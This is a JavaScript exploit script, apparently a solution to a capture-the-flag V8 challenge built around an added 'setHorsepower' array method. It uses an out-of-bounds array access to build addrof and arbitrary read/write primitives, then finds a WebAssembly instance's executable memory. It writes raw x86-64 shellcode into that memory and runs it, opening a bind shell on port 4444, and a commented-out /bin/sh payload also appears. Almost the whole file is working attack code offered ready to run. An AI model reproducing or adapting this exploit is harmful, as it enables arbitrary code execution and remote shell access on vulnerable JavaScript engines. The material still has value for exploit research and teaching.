var buf = new ArrayBuffer(64);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u8_buf = new Uint8Array(buf);

function ftoi(val) {
  f64_buf[0] = val;
  return u64_buf[0];
}

function itof(val) {
  u64_buf[0] = val;
  return f64_buf[0];
}

//var dp = (a) => %DebugPrint(a);

var a = [1.2, 1.2, 1.2];

var rw = new BigUint64Array([
  0x5050505050505050n,
  0x5050505050505050n,
  0x5050505050505050n,
  0x5050505050505050n,
  0x5050505050505050n,
  0x5050505050505050n,
  0x5050505050505050n,
]);

var float_arr = [1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2];

var obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}];

a.setHorsepower(1000);

// We set up array objects, and find out where they are in memory
// They will be allocated at slightly higher addresses than var a
// and we specifically look for them by checking for their length field
// The offset subtracted gets to the start of the object
// The second one found for the float array and the js arrray is the right one (first is the actual buffer)
var big_int_index = -1;
var float_arr_index = -1;
var obj_arr_index = -1;

var float_count = 0;
var obj_count = 0;

for(let i = 0; i < 1000; i++) {
  let foo = ftoi(a[i]);
  if(foo == rw.length  && big_int_index == -1) {
    big_int_index = i - 4;
  }
  // The size of JSArrays is in the upper 32 bits as a SMI
  var jsArrSize = foo >> 33n;

  if(jsArrSize == float_arr.length) {
    float_count++;
    if(float_count == 2) {
      float_arr_index = i - 1;
    }
  }
  if(jsArrSize == obj_arr.length) {
    obj_count++;
    if(obj_count == 2) {
      obj_arr_index = i - 1;
    } 
  }
}

print("Found offsets ", big_int_index, float_arr_index, obj_arr_index);

// The base address to properly handle pointer compression
var base_addr = ftoi(a[big_int_index + 5]) & 0xffffffff00000000n;
print("Found base addr", base_addr.toString(16));

// Get the maps of our float array and our object array, so we can build an addrof primative
// Since the map is the lower half of a 64bit value, capture the other half to make sure nothing gets messed up
var float_arr_map = ftoi(a[float_arr_index]) & 0xffffffffn;
var float_arr_upper = ftoi(a[float_arr_index]) & 0xffffffff00000000n; 
var obj_arr_map = ftoi(a[obj_arr_index]) & 0xffffffffn;
var obj_arr_upper = ftoi(a[obj_arr_index]) & 0xffffffff00000000n; 

// Our addrof function places the object in obj_arr, switches the map to the float one (thus returning the addr as a float)
// Afterwards, make sure to clean up, just to be safe
function addrof(o) {
  obj_arr[0] = o;
  a[obj_arr_index] = itof(obj_arr_upper | float_arr_map);
  var res = ftoi(obj_arr[0]);
  a[obj_arr_index] = itof(obj_arr_upper | obj_arr_map);
  res = (res & 0xffffffffn) + base_addr;
  return res;
}

// Additionally, lets get some read/write primatives. For each, we overwrite the backing pointers (in two halves)
// of our bigint array
function read(addr) {
  var upper = addr & 0xffffffff00000000n;
  var lower = addr & 0xffffffffn;
  a[big_int_index + 5] = itof(upper);
  a[big_int_index + 6] = itof(lower);
  var res = rw[0];
  return res
}

function write(addr, value) {
  var upper = addr & 0xffffffff00000000n;
  var lower = addr & 0xffffffffn ;
  a[big_int_index + 5] = itof(upper);
  a[big_int_index + 6] = itof(lower);
  rw[0] = value;
}

function write_arr(addr, arr) {
  var upper = addr & 0xffffffff00000000n;
  var lower = addr & 0xffffffffn ;
  a[big_int_index + 5] = itof(upper);
  a[big_int_index + 6] = itof(lower);
  for(let i = 0; i < arr.length; i++){
    print(i, rw[i], arr[i]);
    rw[i] = arr[i];
    print(i, rw[i], arr[i]);
  }
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,1,127,1,127,96,0,1,127,3,132,128,128,128,0,3,0,0,1,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,163,128,128,128,0,4,6,109,101,109,111,114,121,2,0,3,98,97,114,0,0,9,102,111,111,98,97,114,98,97,122,0,1,4,109,97,105,110,0,2,10,168,128,128,128,0,3,138,128,128,128,0,0,32,0,32,0,108,32,0,106,11,138,128,128,128,0,0,32,0,32,0,108,32,0,106,11,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_inst_addr = addrof(wasm_instance) - 1n;
var targ_addr = wasm_inst_addr + 0x68n;


// For whatever reason, the wasm_instance can be aligned on something other than 16 bytes
var alignment = targ_addr % 16n;
var t_buff = new ArrayBuffer(256); 
var t_buff_view = new BigUint64Array(t_buff);
t_buff_view[0] = read(targ_addr - alignment);
t_buff_view[1] = read(targ_addr - alignment + 8n);
t_buff_view[2] = read(targ_addr - alignment + 16n);

var new_buff = t_buff.slice(Number(alignment), Number(alignment) + 8);
var good_view = new BigUint64Array(new_buff);
var rwx_mem_addr = good_view[0];

print("Allocated", rwx_mem_addr.toString(16));

// Exec /bin/sh
//var shellcode = [0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05];
// Bind shell 4444
var shellcode = [0x31,0xc0,0x31,0xdb,0x31,0xd2,0xb0,0x01,0x89,0xc6,0xfe,0xc0,0x89,0xc7,0xb2,0x06,0xb0,0x29,0x0f,0x05,0x93,0x48,0x31,0xc0,0x50,0x68,0x02,0x01,0x11,0x5c,0x88,0x44,0x24,0x01,0x48,0x89,0xe6,0xb2,0x10,0x89,0xdf,0xb0,0x31,0x0f,0x05,0xb0,0x05,0x89,0xc6,0x89,0xdf,0xb0,0x32,0x0f,0x05,0x31,0xd2,0x31,0xf6,0x89,0xdf,0xb0,0x2b,0x0f,0x05,0x89,0xc7,0x48,0x31,0xc0,0x89,0xc6,0xb0,0x21,0x0f,0x05,0xfe,0xc0,0x89,0xc6,0xb0,0x21,0x0f,0x05,0xfe,0xc0,0x89,0xc6,0xb0,0x21,0x0f,0x05,0x48,0x31,0xd2,0x48,0xbb,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x48,0xc1,0xeb,0x08,0x53,0x48,0x89,0xe7,0x48,0x31,0xc0,0x50,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05,0x50,0x5f,0xb0,0x3c,0x0f,0x05];

for(let i = 0; i < 0x8; i++) {
   shellcode.unshift(0x90);
}

while(shellcode.length % 8 != 0) {
    shellcode.push(0x90);
}

var payload = [];
for (let i = 0; i < shellcode.length; i++) {
    u8_buf[ (i % 8) ] = shellcode[i];
    if(i % 8 == 7) {
        payload.push(u64_buf[0]);
    }

}

var n = 6;
for(let i = 0; i < payload.length; i+= n){
  write_arr(rwx_mem_addr + BigInt(i * 8), payload.slice(i, i+n));
}



print("Done");
//Breakpoint();
f();
